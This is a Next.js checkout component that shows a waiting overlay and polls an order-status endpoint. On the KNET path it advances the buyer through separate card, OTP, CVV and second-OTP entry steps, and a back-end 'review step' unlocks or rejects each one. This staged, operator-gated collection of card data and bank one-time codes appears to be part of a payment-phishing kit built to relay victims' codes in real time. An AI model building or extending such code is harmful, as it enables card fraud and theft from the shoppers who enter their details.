"use client";

import { useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { useTranslations } from "next-intl";
import type { KnetRejectKind } from "@/views/checkout/knet-reject-overlay";

export type KnetWaitPhase = "card" | "otp" | "cvv" | "otp2";

const RETRY_STEP: Record<string, KnetRejectKind> = {
  retry_card: "card",
  retry_otp: "otp",
  retry_cvv: "cvv",
  retry_otp2: "otp2",
};

export function ApprovalWait({
  orderId,
  locale,
  from,
  knetWaitPhase = null,
  onKnetUnlocked,
  onKnetRetry,
}: {
  orderId: string;
  locale: string;
  from: "knet" | "card";
  knetWaitPhase?: KnetWaitPhase | null;
  onKnetUnlocked?: (target: "knetOtp" | "knetCvv" | "knetOtp2") => void;
  onKnetRetry?: (kind: KnetRejectKind) => void;
}) {
  const t = useTranslations("checkout");
  const router = useRouter();
  const unlockRef = useRef(onKnetUnlocked);
  const retryRef = useRef(onKnetRetry);
  const handledRetryRef = useRef<string | null>(null);
  unlockRef.current = onKnetUnlocked;
  retryRef.current = onKnetRetry;

  useEffect(() => {
    handledRetryRef.current = null;
  }, [orderId, knetWaitPhase]);

  useEffect(() => {
    const timer = setInterval(() => {
      void (async () => {
        const res = await fetch(`/api/order-status?orderId=${encodeURIComponent(orderId)}`, {
          cache: "no-store",
        });
        if (!res.ok) return;
        const data = (await res.json()) as {
          paymentStatus: string | null;
          knetStatus: string | null;
          visaStatus: string | null;
          knetReviewStep: string | null;
        };

        const retryKind = data.knetReviewStep ? RETRY_STEP[data.knetReviewStep] : undefined;
        if (retryKind && retryRef.current) {
          if (handledRetryRef.current === data.knetReviewStep) return;
          handledRetryRef.current = data.knetReviewStep;
          retryRef.current(retryKind);
          return;
        }

        const rejected = data.knetStatus === "rejected" || data.visaStatus === "rejected";
        if (rejected) {
          if (from === "knet" && retryRef.current && knetWaitPhase) {
            if (handledRetryRef.current === `legacy-${knetWaitPhase}`) return;
            handledRetryRef.current = `legacy-${knetWaitPhase}`;
            retryRef.current(
              knetWaitPhase === "otp2"
                ? "otp2"
                : knetWaitPhase === "otp"
                  ? "otp"
                  : knetWaitPhase === "cvv"
                    ? "cvv"
                    : "card"
            );
            return;
          }
          router.push(`/${locale}/checkout/${orderId}?declined=1`);
          router.refresh();
          return;
        }

        if (from === "knet" && knetWaitPhase && unlockRef.current) {
          if (knetWaitPhase === "card" && data.knetReviewStep === "otp_entry") {
            unlockRef.current("knetOtp");
            return;
          }
          if (knetWaitPhase === "otp" && data.knetReviewStep === "cvv_entry") {
            unlockRef.current("knetCvv");
            return;
          }
          if (knetWaitPhase === "cvv" && data.knetReviewStep === "otp2_entry") {
            unlockRef.current("knetOtp2");
            return;
          }
          if (knetWaitPhase === "otp2" && (data.paymentStatus === "paid" || data.knetStatus === "approved")) {
            router.push(`/${locale}/checkout/${orderId}?from=knet`);
            router.refresh();
          }
          return;
        }

        const approved =
          data.paymentStatus === "paid" ||
          data.knetStatus === "approved" ||
          data.visaStatus === "approved";
        if (approved) {
          router.push(`/${locale}/checkout/${orderId}${from === "knet" ? "?from=knet" : ""}`);
          router.refresh();
        }
      })();
    }, 2000);
    return () => clearInterval(timer);
  }, [orderId, locale, from, knetWaitPhase, router]);

  return (
    <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-white/95 px-6 text-center">
      <div className="size-12 animate-spin rounded-full border-4 border-primary border-t-transparent" />
      <p className="mt-6 text-lg font-semibold text-ink">{t("reviewPending")}</p>
      <p className="mt-2 max-w-sm text-sm text-muted">{t("waiting")}</p>
    </div>
  );
}
